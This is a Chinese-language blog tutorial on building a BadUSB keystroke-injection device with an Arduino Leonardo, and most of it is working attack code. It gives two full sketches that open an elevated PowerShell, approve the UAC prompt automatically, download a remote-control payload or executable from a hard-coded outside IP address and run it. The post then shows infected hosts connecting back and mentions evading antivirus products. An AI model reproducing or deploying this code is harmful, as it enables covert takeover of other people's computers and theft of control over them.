# 前言

最近闲来无事,突然先买个badusb了解学习一下,就做了一个badusb,仅作为学习目的

# badusb的制作

直接利用Arduino IDE

https://downloads.arduino.cc/arduino-1.8.16-windows.zip

因为我买的时候leonardo的板子,所以就不用再去下载digispark的开发板管理器和驱动了

leonerdo的驱动是自带的,就在安装包的drivers目录下

![image-20220125132932556](images/1.png)

安装驱动后插入badusb,会有相应的串口

![image-20220125133110833](images/2.png)

我这里是COM5,开发板选择Arduino Leonardo

如果是digispark的板子,就需要去在首选项添加附加开发板管理器地址

![image-20220125133252306](images/3.png)

然后打开开发板管理器

![image-20220125133401407](images/4.png)

在贡献这一栏中找到Digistump AVR Boards,如果没找到的话可以挂外网试试

![image-20220125133435823](images/5.png)

回到正题,我买的是Leonardo的板子,代码和digispark的也有点不同

```
#include <Keyboard.h>
void setup() {
  Keyboard.begin();//开始键盘通讯 
delay(3000);//延时 
Keyboard.press(KEY_LEFT_GUI);//win键 
delay(500);
Keyboard.press('r');//r键
delay(500); 
Keyboard.release(KEY_LEFT_GUI);
Keyboard.release('r');
Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
Keyboard.release(KEY_CAPS_LOCK);
delay(500);
Keyboard.println("powershell Start-Process powershell -Verb runAs");
delay(500);
Keyboard.press(KEY_RETURN); 
Keyboard.release(KEY_RETURN); 
delay(2000);
Keyboard.press(KEY_LEFT_ALT);//alt
delay(500);
Keyboard.press('y');
delay(500);
Keyboard.release(KEY_LEFT_ALT);
Keyboard.release('y');
delay(500);
Keyboard.println("$clnt = new-object system.net.webclient;");
Keyboard.println("$url= 'http://47.93.248.221/payload1.ps1';");  //远程服务器ps1远控地址
Keyboard.println("$file = 'c:\\payload1.ps1';");      //下载到目标存放文件的地址
Keyboard.println("$clnt.downloadfile($url,$file);");  //采用分段执行绕过防火墙进程防护
Keyboard.println("powershell.exe -executionpolicy remotesigned  -file 'c:\\payload1.ps1'"); //本地权限绕过执行木马脚本
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
Keyboard.press(KEY_CAPS_LOCK);
Keyboard.release(KEY_CAPS_LOCK);
Keyboard.end();//结束键盘通讯

}

void loop() {
// put your main code here, to run repeatedly:

}
```

代码的流程

```
1.win+r打开运行窗口
2.开启大写绕过输入法,不然会输出中文导致失败
3.输入powershell Start-Process powershell -Verb runAs以管理员身份运行powershell
4.alt+y在弹出的窗口点击是以打开管理员权限的powershell
5.输入下载的命令($clnt = new-object System.Net.WebClient;$url='http://47.93.248.221/payload1.ps1';$file = 'c:\\payload1.ps1';$clnt.DownloadFile($url,$file);)
6.输入powershell.exe -executionpolicy remotesigned  -file 'c:\\payload1.ps1'以powershell运行下载下来的powershell木马
```

这些只是大致需要的,可以根据自己的需求对应的修改,比如说运行马儿后退出powershell等等

因为输入法的原因,所以在插入的时候键盘应该是英文并且是小写

制作好后点击向右的箭头上传代码到badusb

![image-20220125134336009](images/6.png)



# 实验

插入3台主机的上线效果

![image-20220125134548949](images/7.png)





```
#include <Keyboard.h>
void setup() {  
Keyboard.begin();                                                            //开始键盘通讯 
delay(3000);//延时 
Keyboard.press(KEY_LEFT_GUI);//win键 
delay(500);
Keyboard.press('r');//r键
delay(500); 
Keyboard.release(KEY_LEFT_GUI);
Keyboard.release('r');
Keyboard.press(KEY_CAPS_LOCK);                                                //利用开大写输小写绕过输入法
Keyboard.release(KEY_CAPS_LOCK);
delay(500);
Keyboard.println("CMD ");              //无回显
delay(500);
Keyboard.press(KEY_RETURN); 
Keyboard.release(KEY_RETURN); 
delay(500);
Keyboard.println("powershell Start-Process powershell -Verb runAs");
delay(500);
Keyboard.press(KEY_RETURN); 
Keyboard.release(KEY_RETURN); 
delay(3000);
Keyboard.press(KEY_LEFT_ALT);//alt
delay(500);
Keyboard.press('y');
delay(500);
Keyboard.release(KEY_LEFT_ALT);
Keyboard.release('y');
delay(500);
Keyboard.println("$clnt = new-object system.net.webclient;");
Keyboard.println("$url= 'http://47.93.248.221/badusb.exe';");  //远程服务器ps1远控地址
Keyboard.println("$file = 'c:\\badusb.exe';");      //下载到目标存放文件的地址
Keyboard.println("$clnt.downloadfile($url,$file);");  //采用分段执行绕过防火墙进程防护
delay(200); 
Keyboard.println("exit"); 
delay(200);
Keyboard.println("EXIT");
delay(200);
Keyboard.println("exit");
delay(200);
Keyboard.println("EXIT");
delay(500);
Keyboard.press(KEY_LEFT_GUI);                                                //win键 
delay(500);
Keyboard.press('r');                                                        //r键
delay(500); 
Keyboard.release(KEY_LEFT_GUI);
Keyboard.release('r'); 
Keyboard.println("CMD");
delay(300);                                                             //本地权限绕过执行木马脚本
Keyboard.println("c:\\badusb.exe");
delay(200);
Keyboard.println("EXIT");
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
Keyboard.press(KEY_CAPS_LOCK); 
Keyboard.release(KEY_CAPS_LOCK);
Keyboard.end();                                                                        //结束键盘通讯 
}

void loop() {}
```

badusb没有问题，可能需要重新做一下免杀，能过的越多，那就越强，之前能过360和火绒的马现在也不能过了
